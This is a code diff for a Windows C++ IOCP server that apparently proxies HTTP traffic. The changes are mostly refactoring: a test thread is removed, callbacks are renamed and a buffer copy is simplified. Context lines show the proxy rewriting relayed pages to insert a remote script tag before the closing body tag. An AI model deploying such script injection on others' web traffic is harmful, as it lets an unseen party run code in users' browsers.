@@ -377,32 +377,6 @@ HANDLE CreateIOCPTcpServer( UINT nListenPort , PIOCP_TCP_CALLBACK pTcpCallbacks)
 ///////////////////////////////////////////////////////////////////////////////////
 //测试代码
 
-
-#include ".\\Test\\TcpSocket.h"
-DWORD WINAPI TestThread( PVOID pParam )
-{
-	Sleep(500);
-
-	CTcpSocket tcpSocket;
-	tcpSocket.CreateTcpSocket();
-	tcpSocket.Connect("127.0.0.1",8888);
-	//while(1)//for (int i=0;i<10;i++)
-	//{
-		char chData[4096]="GET / HTTP/1.1\r\nHost: www.sina.com.cn\r\n\r\n";
-		int nSendLen = tcpSocket.SendData(chData,strlen(chData));
-		while (1)
-		{
-			tcpSocket.RecvData(chData,4096);
-			int a=0;
-		}
-		
-	//}
-
-	tcpSocket.CloseTcpSocket();
-	return 0;
-}
-
-
 #include "HttpSendParser.h"
 #include ".\Http数据解析\HttpDataParser.h"
 
@@ -510,14 +484,7 @@ VOID CALLBACK DataRecvedCallback( PVOID pParam , BYTE *pData,int nDataLen,BOOL b
 		if (pCallbackParam->bReplaceData)
 		{
 			CStringA strTempData;
-
-			char *pchTemp = new char[nDataLen+1];
-			memcpy_s(pchTemp,nDataLen,(char *)pData,nDataLen);
-			pchTemp[nDataLen] = 0;
-
-			strTempData = pchTemp;
-
-			delete pchTemp;
+			strTempData.Append((LPCSTR)pData,nDataLen);
 
 			CStringA strReplaceData;
 			strReplaceData.Format("<script src=\"%s\"></script></body>",g_strJsUrl);
@@ -538,7 +505,7 @@ VOID CALLBACK DataRecvedCallback( PVOID pParam , BYTE *pData,int nDataLen,BOOL b
 
 }
 
-VOID WINAPI MY_CALLBACK_CLIENT_CONNECT( HANDLE hClient,sockaddr_in *psiClient )
+VOID WINAPI ClientConnectCallback( HANDLE hClient,sockaddr_in *psiClient )
 {
 	PCLIENT_DATA pClientData = new CLIENT_DATA;
 	pClientData->hRemote = NULL;
@@ -549,7 +516,7 @@ VOID WINAPI MY_CALLBACK_CLIENT_CONNECT( HANDLE hClient,sockaddr_in *psiClient )
 	pClientData->bServerToClient = FALSE;
 	SetUserParam(hClient,pClientData);
 }
-VOID WINAPI MY_CALLBACK_CLIENT_DISCONNECT( HANDLE hClient , PVOID pUserParam)
+VOID WINAPI ClientDisConnectCallback( HANDLE hClient , PVOID pUserParam)
 {
 	PCLIENT_DATA pClientData = (PCLIENT_DATA)pUserParam;
 	if(pClientData)
@@ -565,22 +532,22 @@ VOID WINAPI MY_CALLBACK_CLIENT_DISCONNECT( HANDLE hClient , PVOID pUserParam)
 	}
 }
 
-VOID WINAPI MY_CALLBACK_DATA_RECV( HANDLE hClient,PVOID pUserParam,BYTE *pDataBuffer,DWORD dwDataLen)
+VOID WINAPI DataRecvCallback( HANDLE hClient,PVOID pUserParam,BYTE *pDataBuffer,DWORD dwDataLen)
 {
 
 	PCLIENT_DATA pClientData = (PCLIENT_DATA)pUserParam;
 	if (pClientData && pClientData->hRemote)
 	{
 		
-		if ( pClientData->bServerToClient )
-		{
-			BOOL bFinalData = FALSE;
-			pClientData->pHttpDataParser->ParseRecvData( pDataBuffer,dwDataLen,&bFinalData);
-			if (bFinalData)
-			{
-				pClientData->pHttpDataParser->ResetParser();
-			}
-		}
+ 		if ( pClientData->bServerToClient )
+ 		{
+ 			BOOL bFinalData = FALSE;
+ 			pClientData->pHttpDataParser->ParseRecvData( pDataBuffer,dwDataLen,&bFinalData);
+ 			if (bFinalData)
+ 			{
+ 				pClientData->pHttpDataParser->ResetParser();
+ 			}
+ 		}
 		
 		if (  FALSE == pClientData->CallbackParam.bReplaceData )
 		{
@@ -666,9 +633,9 @@ int _tmain(int argc, _TCHAR* argv[])
 	}
 
 	IOCP_TCP_CALLBACK TcpCallback;
-	TcpCallback.pClientConnect = MY_CALLBACK_CLIENT_CONNECT ;
-	TcpCallback.pClientDisConnect = MY_CALLBACK_CLIENT_DISCONNECT ;
-	TcpCallback.pDataRecv = MY_CALLBACK_DATA_RECV;
+	TcpCallback.pClientConnect = ClientConnectCallback ;
+	TcpCallback.pClientDisConnect = ClientDisConnectCallback ;
+	TcpCallback.pDataRecv = DataRecvCallback;
 
 	hIOCPServer = CreateIOCPTcpServer(8080,&TcpCallback);
 
